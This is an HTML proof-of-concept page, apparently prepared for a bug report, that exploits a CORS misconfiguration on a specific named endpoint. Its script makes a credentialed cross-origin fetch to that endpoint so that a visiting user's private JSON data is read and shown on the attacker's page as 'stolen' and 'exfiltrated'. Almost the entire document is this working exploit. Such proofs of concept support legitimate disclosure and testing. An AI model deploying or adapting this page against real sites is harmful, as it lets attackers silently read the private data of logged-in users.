<!DOCTYPE html>
<html>
<head>
    <title>CORS Misconfiguration PoC - ravnix</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 30px; background-color: #f4f6f9; color: #333; }
        .container { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        h1 { color: #d9534f; }
        pre { background: #272822; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; }
        .status { font-weight: bold; color: #5cb85c; }
    </style>
</head>
<body>

<div class="container">
    <h1>CORS Exploit Demo (Unauthorized Data Access)</h1>
    <p>Status: <span id="status" class="status">Exploiting...</span></p>
    <h3>Stolen Sensitive Metadata (JSON Response):</h3>
    <pre id="output">Waiting for response...</pre>
</div>

<script>
    const targetUrl = "https://experiments.bany.dev/sdk/v2/vardata?v=0";

    fetch(targetUrl, {
        method: "GET",
        credentials: "include", 
        mode: "cors"
    })
    .then(response => {
        if (!response.ok) {
            throw new Error("HTTP error " + response.status);
        }
        return response.json();
    })
    .then(data => {
        document.getElementById("status").innerText = "Success! Private Data Exfiltrated.";
        document.getElementById("output").innerText = JSON.stringify(data, null, 2);
    })
    .catch(error => {
        document.getElementById("status").innerText = "Failed";
        document.getElementById("status").style.color = "#d9534f";
        document.getElementById("output").innerText = "Error fetching data: " + error.message;
    });
</script>

</body>
</html>
